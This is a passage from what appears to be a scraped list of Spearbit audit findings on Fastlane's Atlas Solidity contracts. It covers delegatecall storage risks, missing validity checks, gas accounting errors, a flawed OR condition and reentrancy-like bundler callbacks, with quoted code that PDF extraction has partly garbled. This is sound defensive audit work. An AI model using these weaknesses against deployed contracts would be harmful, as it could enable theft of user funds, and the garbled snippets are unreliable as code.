trivial:  If DAppControl based contracts use a storage variable it wil be stored in the ExecutionEnvironment and it can be changed by a user contract if called via delegatecall.  Contract ChainlinkDAppControl uses storage variable verificationVars (but luckily delegateUser: false).  Contract SwapIntentController allows delegatecall via delegateUser: true (but luckily no storage variables).  DAppControl has two storage variables: governance and pendingGovernance, which means all functions that access these should not be delegatecalled.  The functions getDAppSignatory(), transferGovernance() and acceptGovernance() don't have the modifier mustBeCalled so could accidentally be called via delegatecall. 41 abstract contract DAppControl is DAppControlTemplate, ExecutionBase { // ... address public governance; address public pendingGovernance; // ... } contract SwapIntentController is DAppControl { constructor(address _atlas) DAppControl(_atlas, msg.sender, CallConfig({ // ... delegateUser: true, // ... }) ) // ... } contract ChainlinkDAppControl is DAppControl { // ... mapping(address baseChainlinkFeed => VerificationVars) internal verificationVars; // storage constructor(address _atlas) DAppControl(_atlas, msg.sender, CallConfig({ // ... delegateUser: false, // ... }) ) // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "V2DAppControl _preOpsCall() doesn't check destination for call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_preOpsCall() calls a function from userOp.dapp but doesn't check if it is a valid uniswap V2 compatible pair. function _preOpsCall(UserOperation calldata userOp) internal override returns (bytes memory) { // ... (uint112 token0Balance, uint112 token1Balance,) = IUniswapV2Pair(userOp.dapp).getReserves(); // ... _transferUserERC20( amount0Out > amount1Out ? IUniswapV2Pair(userOp.dapp).token1() : ,! IUniswapV2Pair(userOp.dapp).token0(), userOp.dapp, amount0In > amount1In ? amount0In : amount1In ); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "No validity check on chainlinkWrapper", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In _allocateValueCall() there is no check done that chainlinkWrapper is valid. function _allocateValueCall(address bidToken, uint256 bidAmount, bytes calldata data) internal virtual ,! override { address chainlinkWrapper = abi.decode(data, (address)); (bool success,) = chainlinkWrapper.call{ value: bidAmount }(\"\"); if (!success) revert FailedToAllocateOEV(); }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "CallValueTooHigh error calculation is incorrect", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the _validateSolverOperation() function, the following check verifies that solverOp.value is larger than address(this).balance minus a gas amount: // Verify that we can lend the solver their tx value if ( solverOp.value > address(this).balance - (gasLimit * tx.gasprice > address(this).balance ? 0 : gasLimit * tx.gasprice) return (result |= 1 << uint256(SolverOutcome.CallValueTooHigh), gasLimit); ,! ) { } the gasLimit * tx.gasprice > address(this).balance check appears to prevent a In this calculation, in the subtraction underflow if gasLimit * tx.gasprice is larger than address(this).balance. However, case where the underflow would happen, is 0 (which results in solverOp.value > address(this).balance) when it was likely intended to be address(this).balance (which results in solverOp.value > 0). the subtracted amount Moreover, it's not clear if this subtraction is completely necessary for this check. Since the transaction gas costs will not decrease address(this).balance, and since all borrowed ETH and gas refunds are guaranteed to be paid at the end of an Atlas transaction, it may be possible to simplify the check.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Signatures may be reused between the ChainlinkAtlasWrapper and BASE_FEED", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The ChainlinkAtlasWrapper is intended to be a wrapper of the Chainlink BASE_FEED contract, with the two contracts potentially sharing the same signers and transmitters. Since both contracts have the same arguments and verification logic in the transmit() function, it seems that the report and corresponding signatures for one contract can also be used in the other contract. This may not be intended, and may add a trust assumption that the transmitter relays information to the correct contract that the signers are expecting.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "claims accounting does not track all execution costs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "To facilitate bundler gas reimbursements, the claims storage variable tracks the gas costs between two different gasleft() checkpoints. Since the gas costs incurred after the second checkpoint are not tracked, there is some amount of gas that the bundler is not reimbursed. Currently, this amounts to all of the following code within _settle(): gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000); _claims -= gasRemainder; if (_deposits < _claims + _withdrawals) { // CASE: in deficit, subtract from bonded balance uint256 amountOwed = _claims + _withdrawals - _deposits; if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); } } else { // CASE: in surplus, add to bonded balance // TODO: make sure this works w/ the surcharge 10% uint256 amountCredited = _deposits - _claims - _withdrawals; _credit(winningSolver, amountCredited); } uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000; _claims -= netGasSurcharge; surcharge = _surcharge + netGasSurcharge; SafeTransferLib.safeTransferETH(bundler, _claims); return (_claims, netGasSurcharge); and also includes the cost of later emitting the MetacallResult() event and calling _releaseAtlasLock(). While these are not necessarily large costs, making the gas accounting more fair for the bundler may be possible.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Similar functions pack() and _firstSet()/_firstSetSpecial() use different patterns", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The similar functions pack() and _firstSet()/_firstSetSpecial() use different patterns. pack() uses a typecast to bytes32() while the other functions don't. Note: the typecast to bytes32() truncates the data if it is larger than 32 bytes, which isn't the case here. function pack(EscrowKey memory self) internal pure returns (bytes32 packedKey) { packedKey = bytes32( //bytes32 not present in other functions and truncates data abi.encodePacked( self.addressPointer, // ... ) ); } function _firstSet() internal pure returns (bytes memory data) { data = abi.encodePacked( _addressPointer(), // ... ); } function _firstSetSpecial(ExecutionPhase phase) internal pure returns (bytes memory data) { // ... data = abi.encodePacked( _addressPointer(), // ... ); }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "USER_TYPE_HASH and SOLVER_TYPE_HASH define data as bytes32", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The USER_TYPE_HASH and SOLVER_TYPE_HASH define data as bytes32, while in reality it is bytes. _getProofHash() and _getSolverHash() do already hash the data. 46 bytes32 constant USER_TYPE_HASH = keccak256(\"UserOperation(... ,bytes32 data)\"); bytes32 constant SOLVER_TYPE_HASH = keccak256(\"SolverOperation(... ,bytes32 data)\"); function _getProofHash(UserOperation memory userOp) internal pure returns (bytes32 proofHash) { proofHash = keccak256( abi.encode( // ... keccak256(userOp.data) ) ); } function _getSolverHash(SolverOperation calldata solverOp) internal pure returns (bytes32 solverHash) { return keccak256( abi.encode( // ... keccak256(solverOp.data) ) ); }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "SOLVER_TYPE_HASH contains different field than SolverOperation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The SOLVER_TYPE_HASH contains dapp, wheras the struct SolverOperation has solver at the same location. bytes32 constant SOLVER_TYPE_HASH = keccak256( \"SolverOperation(address from, ... uint256 deadline, address dapp, // should probably be solver address control, ... )\" ); struct SolverOperation { // ... uint256 deadline; address solver; address control; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Statistics for auctionWins and auctionFails are inaccurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _assign() keeps statistics for auctionWins and auctionFails. The inverse function _credit() doesn't keep statistics. function _assign(/*...*/ ) /*...*/ { // ... if (solverWon) { aData.auctionWins++; } else if (!bidFind) { aData.auctionFails++; } // ... } function _credit(address owner, uint256 amount) internal { // ... // no statistics }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "totalGasUsed is inaccurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In function _assign(), amount can be changed if the solver has insufficient funds. The totalGa- sUsed uses the corrected version, because it is mean to analytics, the original value is probably better. The inverse function _credit() doesn't keep statistics. Furthermore, _assign() is called for two purposes. One to assign gas costs and one to assign missing ETH. Only the first one seems relevant for analytics. 48 function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... if (bData.unbonding + aData.bonded < amt) { // ... amount = uint256(bData.unbonding + aData.bonded); // contribute less to deposits ledger // ... } ... // Reputation Analytics: Track total gas used, solver wins, and failures aData.totalGasUsed += uint64(amount / GAS_USED_DECIMALS_TO_DROP); // ... } function _credit(address owner, uint256 amount) internal { // ... // no statistics for totalGasUsed }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "userWrapper() does not always need forward() data", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "At the end of the userWrapper() function, a call or delegatecall is made to the userOp.dapp address: if (config.needsDelegateUser()) { (success, returnData) = userOp.dapp.delegatecall(forward(userOp.data)); require(success, \"ERR-EC02 DelegateRevert\"); } else { // regular user call - executed at regular destination and not performed locally (success, returnData) = userOp.dapp.call{ value: userOp.value }(forward(userOp.data)); require(success, \"ERR-EC04a CallRevert\"); } Notice that this call will use the forward() helper function. This function appends extra data (e.g. address pointers, call depth, etc) so that Atlas-specific contracts can inspect the state of the call. However, the userOp.dapp address may not be an Atlas-specific contract. For example, with the V2DAppControl, the userOp.dapp address would be a UniswapV2 pool. As a result, the extra calldata will not always be used or expected. In rare scenarios, this might cause reverts in protocols that have unique calldata expectations.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Balance diff considerations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the solverMetaTryCatch() function, the ExecutionEnvironment tracks the difference in its bid token balance before and after the solver receives control flow. The assumption is that an increase in token balance would be due to a direct transfer from the solver. However, there are niche situations where this assumption might not hold. For example, if the ExecutionEnvi- ronment becomes eligible for an airdrop, and if the airdrop transfer can be triggered by an arbitrary address (this is how the Uniswap MerkleDistributor works), then solvers might trigger the airdrop to subsidize their bid. This would be unexpected, as the airdrop already belongs to the ExecutionEnvironment, but is not explicitly part of its balance. If the ExecutionEnvironment was used more generally as a smart contract wallet, there may be other ways that a balance diff becomes problematic. For example, if the ExecutionEnvironment has permitted a non-Atlas protocol to exchange one of its tokens, fulfilling that order could increase the bid token balance, and wouldn't be related to the solver's actions. This is similar to a bug that appeared in UniswapX.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "_credit() deviates from logic in _assign()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _assign() updates deposits but the mirror function _credit() doesn't update with- drawals. As can be called from multiple locations it is important there. _credit() can only be called from via _settle(). However, after this call there is an external call via safeTransferETH() so it is potentially risky to not update withdrawals. See issue \"Call to safeTransferETH can do unwanted actions\". As far as we can see, no harm can be done. 50 function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); // uses updated ,! deposits } } else { // ... _credit(winningSolver, amountCredited); } // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... bondedTotalSupply -= amount; deposits += amount; } function _credit(address owner, uint256 amount) internal { // ... bondedTotalSupply += amount; // ... // no change in withdrawals }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Special cases for deadline == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "It seems userOp.deadline==0 and dAppOp.deadline==0 indicate there is no deadline. However there is no special case for solverOp.deadline == 0. _handleAltOpHash() enforces the deadlines of solverOp and userOp.deadline to be the same. So could be an issue if solverOp.deadline == 0 isn't supported. 51 function _validCalls( // ... if (block.number > userOp.deadline) { if (userOp.deadline != 0 && !isSimulation) { return (userOpHash, ValidCallsResult.UserDeadlineReached); } } if (block.number > dAppOp.deadline) { if (dAppOp.deadline != 0 && !isSimulation) { return (userOpHash, ValidCallsResult.DAppDeadlineReached); } } // ... } function _validateSolverOperation( // ... if (block.number > solverOp.deadline) { // no exception for 0 return (/*...*/ ); } // ... } function _handleAltOpHash(/*...*/ ) /*...*/ { // ... if (solverOp.deadline != userOp.deadline || solverOp.control != userOp.control) { return false; } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "_handleAltOpHash() executed even in error situations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "If _validateSolverOperation() fails then _handleAltOpHash() is still executed. There are two main reasons for _validateSolverOperation() to fail:  block.number related. Error with block.number don't seem to be good reason to still do _handleAl- tOpHash() because this prevents executing the solverOp on a later moment in time. Note: also see a suggestion to move the block.number related checks in issue \"Difference between Sorter and Atlas functions\".  Gas related. This might be a good reason. In _executeSolverOperation(), when _handleAltOpHash() fails then the result of _validateSolverOpera- tion() is returned an no additional error bit for the failing of _handleAltOpHash() is set. 52 function _getBidAmount(/*...*/ ) /*...*/ { // ... (result, gasLimit) = _validateSolverOperation(dConfig, solverOp, gasWaterMark, result); if (dConfig.callConfig.allowsTrustedOpHash()) { if (!_handleAltOpHash(userOp, solverOp)) { return (0); } } // ... } function _executeSolverOperation(/*...*/ ) /*...*/ { // ... (result, gasLimit) = _validateSolverOperation(dConfig, solverOp, gasWaterMark, result); if (dConfig.callConfig.allowsTrustedOpHash()) {  if (!prevalidated && !_handleAltOpHash(userOp, solverOp)) { // doesn t add its own error bit key.solverOutcome = uint24(result); // result is off the previous action return (false, key); } } }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Unreachable code in _assign()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _assign() can be called from _releaseSolverLock() and _settle(). In both cases amount will not be 0. See pieces of code below. This means the code if (amount == 0) { ... } will never be executed. This is fortunate though because:  _bidFindingIteration() calls _getBidAmount(), which calls _releaseSolverLock() which calls _assign().  _assign() would maybe set lastAccessedBlock == block.number.  Then _bidFindingIteration() continues and calls _executeSolverOperation() which calls _validate- SolverOperation().  _validateSolverOperation() checks lastAccessedBlock == block.number, which would be true now and result in an error. 53 function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { if (amount == 0) { accessData[owner].lastAccessedBlock = uint32(block.number); // still save on bidFind } else { // ... if (!bidFind) { aData.lastAccessedBlock = uint32(block.number); } } } uint256 gasWaterMark = gasleft(); function _releaseSolverLock(/*...*/ , uint256 gasWaterMark, /*...*/ ) /*...*/ { // ... uint256 gasUsed = (gasWaterMark - gasleft() + 5000) * tx.gasprice; // other action to increase gasUsed _assign(/*...*/ , gasUsed, /*...*/ ); // gasUsed at least 5000 * tx.gasprice // ... } function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { uint256 amountOwed = _claims + _withdrawals - _deposits; if (_assign(/*...*/ , amountOwed, /*...*/ )) { /*...*/ } // amountOwed > 0 otherwise doesn  t end up here } // ... ,! }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "_removeSignatory() can silently fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The _removeSignatory() function has the following implementation: function _removeSignatory(address controller, address signatory) internal { bytes32 signatoryKey = keccak256(abi.encodePacked(controller, signatory)); delete signatories[signatoryKey]; for (uint256 i = 0; i < dAppSignatories[controller].length; i++) { if (dAppSignatories[controller][i] == signatory) { dAppSignatories[controller][i] = ,! dAppSignatories[controller][dAppSignatories[controller].length - 1]; dAppSignatories[controller].pop(); break; } } } This code does not check that the signatory is indeed a signatory for the controller in question. Since re- moveSignatory() can be called by arbitrary signatory addresses, and since _addSignatory() does have extra sanity checks, it would make sense to enforce that the signatory actually exists before removing it. 54 Note: changeDAppGovernance() does have this additional check : function changeDAppGovernance(address oldGovernance, address newGovernance) external { // ... if (!signatories[signatoryKey]) revert AtlasErrors.DAppNotEnabled(); _removeSignatory(controller, oldGovernance); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "ChainlinkAtlasWrapper sanity check can be stronger", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the ChainlinkAtlasWrapper, the following code determines the median observation, and ensures the observation is a positive value: // Check observations are ordered, then take median observation for (uint256 i = 0; i < r.observations.length - 1; ++i) { bool inOrder = r.observations[i] <= r.observations[i + 1]; if (!inOrder) revert ObservationsNotOrdered(); } int192 median = r.observations[r.observations.length / 2]; if (median <= 0) revert AnswerMustBeAboveZero(); Since it's enforced that the median is a positive value, it is likely that all observations should be positive, which is currently not checked. 55", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Unused DAppOperation fields", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The DAppOperation struct has the following definition: struct DAppOperation { address from; // signor address address to; // Atlas address uint256 value; uint256 gas; uint256 nonce; uint256 deadline; address control; // control address bundler; // msg.sender bytes32 userOpHash; // keccak256 of userOp.to, userOp.data bytes32 callChainHash; // keccak256 of the solvers bytes signature; txs  } Currently, the to, value, and gas fields are not used in the code (other than to contribute to the hash of the entire struct). As specified in the comments, the to address was likely meant to be checked to match the ATLAS address. The gas and value fields can likely be removed since different structs already cover this functionality.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "solverMetaTryCatch() should not have reverting external calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In both the _getBidAmount() and _executeSolverOperation() functions, a call to solverMeta- TryCatch() in the ExecutionEnvironment is made. In both cases, this call may revert, and the error message of this revert has important consequences (e.g. for determining simulated bid amounts, or for assigning blame for the revert). As a result, it's important that there are no external calls in solverMetaTryCatch() that can revert the entire call with an arbitrary error message. Currently, this is a risk with the call to ERC20(solverOp.bidToken).balanceOf(address(this)), since it is not wrapped in a try-catch block, and solverOp.bidToken can be an arbitrary contract. So, for example, a malicious ERC20 token might revert with the AtlasErrors.BidFindSuccessful() error selector to spoof a fake bid amount. Users will likely not interact with malicious ERC20 implementations anyway, but this poses a risk if they do. It's also worth noting that several internal reverts can happen in solverMetaTryCatch(), for example, errors with abi.decode() or with arithmetic underflow/overflow. There is less risk in these cases, since these reverts have fixed error selectors and would be treated as a failure (in the case of _getBidAmount()) or as the generic Solver- Outcome.EVMError result (in the case of _executeSolverOperation()). 56", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "sessionKeys can't be expired", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The whitepaper contains: However ther is no (onchain) functionality to expire or revoke sessionKeys.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Workaround manuallyUpdateNonceTracker() might not work", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The loop in function getNextNonce() could run out of gas, although relatively unlikely. A workaround exist via manuallyUpdateNonceTracker(). However it is important that the caller is able to call this function. If the caller would be a smart contract, it might not be able to. function getNextNonce(address account, bool sequenced) external view returns (uint256) { // ... do { } unchecked { ++n; bytes32 bitmapKey = keccak256(abi.encode(account, nonceTracker.highestFullAsyncBitmap + n)); NonceBitmap memory nonceBitmap = nonceBitmaps[bitmapKey]; bitmap256 = uint256(nonceBitmap.bitmap); } while (bitmap256 == FULL_BITMAP); // ... } function manuallyUpdateNonceTracker(address account) external { // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "_getMimicCreationCode relies on Solidity format for offsets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In function _getMimicCreationCode() the mstores are done on very specific locations, recognizable by the statements add(creationCode, 85). So this function relies highly on the compiled solidity code and thus on the exact compiler version and optimization settings. Any updates in these require a change in _getMimicCre- ationCode() and it is easy to make mistakes. function _getMimicCreationCode(/*...*/ ) /*...*/ { // ... creationCode = type(Mimic).creationCode; assembly { mstore( add(creationCode, 85), or( and(mload(add(creationCode, 85)), not(shl(96, ,! 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))), shl(96, executionLib) ) ) mstore( add(creationCode, 118), or( ,! 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))), and(mload(add(creationCode, 118)), not(shl(96, shl(96, user) ) ) mstore( add(creationCode, 139), or( and( mload(add(creationCode, 139)), not(shl(56, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFF)) ), add(shl(96, controller), add(shl(88, 0x63), shl(56, callConfig))) ) ) mstore(add(creationCode, 165), controlCodeHash) } }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "_getMimicCreationCode relies on Solidity format for layout", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In function _getMimicCreationCode(), the add(shl(88, 0x63) ..) is redundant, because its al- ready kept by the mask with 00 above. With the applied compiler version, this value in the Mimic code is 0x63. In that case, OR-ing it with 0x63 results in the same value. However it costs additional gas and with other Solidity versions this value might change. function _getMimicCreationCode(/*...*/ ) /*...*/ { // ... mstore( add(creationCode, 139), or( and( mload(add(creationCode, 139)), not(shl(56, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFF)) // note the 00 ), add(shl(96, controller), add(shl(88, 0x63), shl(56, callConfig))) ) ) mstore(add(creationCode, 165), controlCodeHash) } }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Return a tuple of (preOpsReturnData, userReturnData) in _preOpsUserExecutionIteration()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "returnData returned by _preOpsUserExecutionIteration() means different things in different con- text: needsPreOpsCall && needsPreOpsReturnData needsUserReturnData returnData F F T T F T F T empty userReturnData preOpsReturnData preOpsReturnData++userReturnData We modified this function a bit to test difference cases. For this case:  needsPreOpsCall = T, needsPreOpsReturnData = F, needsUserReturnData = F, even if the function returns preOpsReturnData (instead of empty), the test cases pass. That indicates either a lack of coverage or a bug in the code.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "WETH_X_GOVERNANCE_POOL may not have governance token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The following check doesn't protect against the case when governance token isn't part of the pool. It only ensures that at least one of the tokens is WETH. govIsTok0 = (IUniswapV2Pair(WETH_X_GOVERNANCE_POOL).token0() == GOVERNANCE_TOKEN); if (govIsTok0) { require(IUniswapV2Pair(WETH_X_GOVERNANCE_POOL).token1() == WETH, \"INVALID TOKEN PAIR\"); } else { require(IUniswapV2Pair(WETH_X_GOVERNANCE_POOL).token0() == WETH, \"INVALID TOKEN PAIR\"); }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "metacall() doesn't always use netGasSurcharge", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In function metacall(), when a solver has won the auction then a netGasSurcharge is withheld and an emit is done. When an error occurs, then netGasSurcharge isn't withheld and no emit is done, even if metacall() doesn't revert itself. Adding a netGasSurcharge might be useful to prevent spam transactions. function metacall(/*...*/ ) /*...*/ { // ... try this.execute{ value: msg.value }(/*...*/ ) returns (/*...*/ ) { (uint256 ethPaidToBundler, uint256 netGasSurcharge) = _settle({ /*...*/ }); emit MetacallResult(/*...*/ , ethPaidToBundler, netGasSurcharge); ); } catch (bytes memory revertData) { if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); // send to bundler // no netGasSurcharge // no emit } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Use tryRecover() for signature verification", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "recover() reverts if the recovered signature is address(0) which is the case for invalid signatures. So call validation reverts instead of bubbling up the error. These function is called via metacall() which isn't supposed to revert as per this comment: // Gracefully return if not valid. This allows signature data to be stored, which helps prevent // replay attacks. // NOTE: Currently reverting instead of graceful return to help w/ testing. TODO - still reverting? (bytes32 userOpHash, ValidCallsResult validCallsResult) = ,! IAtlasVerification(VERIFICATION).validateCalls( dConfig, userOp, solverOps, dAppOp, msg.value, msg.sender, isSimulation ); A single invalid signature from solver can revert the entire execute and prevent userOp to be executed. Although this invalid signature shouldn't land onchain for actual execution as it should be caught in simulation. ERC-4337 has the same requirement for signature failures. Note: some of the example use ecrecover(). This returns 0 when the signatures don't match which might go undetected.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Disposable sessionKeys might be deleted too soon", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The bundler can be a (disposable) sessionKey, which can receive ETH from metacall(). After this sessionKey is disposed of, the ETH is no longer available. function metacall(/*...*/ ) /*...*/ { // ... // Refund the msg.value to sender if it errored if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "OR operator is used instead of AND operator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "SwapIntent.swap() function does a require check and then uses the same condition in the if condition: require(swapIntent.tokenUserSells != swapIntent.auctionBaseCurrency, \"ERR-PI008 SellIsSurplus\"); // ... if ( swapIntent.auctionBaseCurrency != swapIntent.tokenUserSells || swapIntent.auctionBaseCurrency != swapIntent.tokenUserBuys ) { Regardless of the require check, (a != c || a != b) is always true. This if condition is meant to be an AND instead of OR.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Calls to AtlETH functions not restricted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Several functions of AtlETH could potentially be called during a metacall(), possibly while execution is given to another contract with a safeTransferETH() call. This could interfere with the functionality of Atlas which relies on the AtlETH information to stay the same. Also see the issue \"Call to safeTransferETH can do unwanted actions\".", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Call to safeTransferETH can do unwanted actions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "metacall() and _settle() do an safeTransferETH() to the bundler. The bundler can intercept this call via an receive() and do one of the following unwanted actions:  Do revert(). In that case the original call will also revert, see Solmate SafeTransferLib. This way for example the transactions of specific solvers could be reverted. Note: When reuseUserOp == false then reverts should be avoided.  Call reconcile(), see issue \"Reconcile() can be called by anyone\".  Call functions of AtlETH, see issue \"Calls to AtlETH functions not restricted\". function metacall(/*...*/ ) /*...*/ { // ... try this.execute{ value: msg.value }(/*...*/ ) // ... } catch (bytes memory revertData) { // ... if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); // bundler } // ... } function _settle(/*...*/ ) /*...*/ { // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } these scenarios would give the bundler control flow after Also, note that the final checks on de- posits/withdrawals/claims, but before the main Atlas lock is released. This is a potentially dangerous location to give control flow, as any fund transfers would be untracked. Fortunately, this is not exploitable because, for example, the ExecutionEnvironment currently can't reach a delegatecall without entering Atlas first. However, eliminating this dangerous external call could help prevent future issues if the code is changed.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Include simulation mode information as custom error argument", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "wherever isSimulation is used, the code is always reverting except at Atlas.sol#L133-L135 where the execution can still continue. To remove the if/else branch on reverts conditioned on isSimulation - a custom error, which takes isSimulation as an argument, can be used. It simplifies the code.", "labels": ["Spearbit", "Fastlane", "Severity: Gas Optimization"]}, {"title": "_deduct() reverts can be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _deduct() reverts with a generic error if aData.unbonding < _shortfall, while in other situations it has a specific error. The revert InsufficientBalanceForDeduction() could get the balance in a cheaper way. function _deduct(address account, uint256 amount) internal { uint112 amt = uint112(amount); EscrowAccountBalance memory aData = _balanceOf[account]; uint112 balance = aData.balance; if (amt <= balance) { // ... } else if (block.number > accessData[account].lastAccessedBlock + ESCROW_DURATION) { uint112 _shortfall = amt - balance; // ... aData.unbonding -= _shortfall; // underflow here to revert if insufficient balance // ... } else { revert InsufficientBalanceForDeduction(_balanceOf[account].balance, amount); } }", "labels": ["Spearbit", "Fastlane", "Severity: 